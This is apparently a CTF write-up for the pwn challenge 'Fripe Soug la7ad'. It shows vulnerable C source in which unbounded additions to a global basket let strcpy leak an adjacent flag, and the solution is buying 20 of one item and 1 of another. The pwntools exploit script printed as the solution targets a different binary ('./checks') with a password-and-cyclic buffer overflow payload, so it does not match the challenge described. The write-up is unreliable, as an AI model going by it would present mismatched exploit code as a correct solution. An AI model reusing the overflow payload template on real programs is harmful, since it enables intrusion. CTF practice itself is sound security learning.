---
layout: post
title: Cybertrace CTF - Fripe Soug la7ad
categories: [Write-Ups, Pwn]
tags: [Write-ups, Pwn]
featured-image:  Images/cybertrace.png
featured-image-alt: Cybertrace CTF
---

It's a write-up about the challenge : [Cybertrace CTF - Fripe Soug la7ad]
	
## 1. Challenge

In this task we can see two problems : 
1-No control on the amount of products that will be added into the "my_basket" global variable which size is only 288 bytes
2-in the basket function it copies from my_basket to local_basket without through the strcpy function which only stops copying data when facing null-byte


```
  
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
//0x55555555a490
int total; //0x555555558040
char my_basket[288]; //0x555555558060
char flag[40]; //0x555555558180

void menu() {
        puts("1. Tfadhel Echri");
        puts("2. L7esba");
        puts("3. Aya Tirr Rawa7");
}

int read_int32() {
        int num;
        printf("> ");
        scanf("%d", &num);
        return num;
}

void add_product(int prod) {
        char *products[] = {"Sabbat Ghzela\n", "Tshirt Nike\n", "Casquette\n", "Maryoul CyberTrace\n"};
        int prices[] = {40, 5, 10, 999};
        int offset = prod - 1;
        memcpy(my_basket + strlen(my_basket), products[offset], strlen(products[offset]));
        total += prices[offset];
}

void buy() {
        int product;
        puts("======= ¡Edhika Laswem! =======");
        puts("1. Sabbat Ghzela (40 DT)");
        puts("2. Klasset Tijani (5 DT)");
        puts("3. Casquette (10 DT)");
        puts("4. Maryoul CyberTrace (999 DT)");
        puts("======= ¡Edhika Laswem! =======");
        product = read_int32();
        if ((1 <= product) && (product <= 4)) {
                add_product(product);
        }
        else {
                puts("No Such Product.");
        }
}

void basket() {
        printf("========== %d DT ==========\n", total);
        char local_basket[350];
        memset(local_basket, 0, 350);
        strcpy(local_basket, my_basket);
        char *prod = strtok(local_basket, "\n");
        int counter = 1;

        while (prod != NULL) {
                printf("%d. %s\n", counter, prod);
                prod = strtok(NULL, "\n");
                counter += 1;
        }

        printf("========== %d DT ==========\n", total);
}

int main() {
        int choice;
        FILE *flag_file = fopen("flag.txt", "r");
        struct stat st;
        stat("flag.txt", &st);
        fread(flag, st.st_size, 1, flag_file);

        while (1) {
                menu();
                choice = read_int32();
                switch(choice) {
                        case 1:
                                buy();
                                break;
                        case 2:
                                basket();
                                break;
                        case 3:
                                return 0;
                        default:
                                puts("Invalid Choice.");
                }
        }
}

```

## 2. Solution

My approach was to fill with the correct amount of items in the my_basket variable to overwrite the null-terminator in my_basket so when the strcpy triggers it will copy the flag too.
They both exist in the bss section since they are both global variables and we can check it by examining the bss address we get this
![bss section](/assets/img/Images/fripe.png)
I was able to overwrite the null-terminator by adding 20 ```Sabbat Ghzela (40 DT)``` and 1 ```Casquette (10 DT)``` 
and here's my exploit to solve the Task
```
from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x401235
break *0x40123f
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './checks'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

password = b"password123\x00"

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(password + cyclic(100))
offset -= len(password)

# Start program
io = start()

# Build the payload
payload = flat([
    password,
    (offset - 16) * asm('nop'),
    p32(0x11),
    p32(0x3d),
    p32(0xf5),
    p32(0x37),
    p32(0x32),
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(':', payload)
io.recvline()

# Get our flag!
flag = io.recv()
success(flag)
```



The flag was : **CyberTrace{h4bL1h_Y4_m4dAM3}**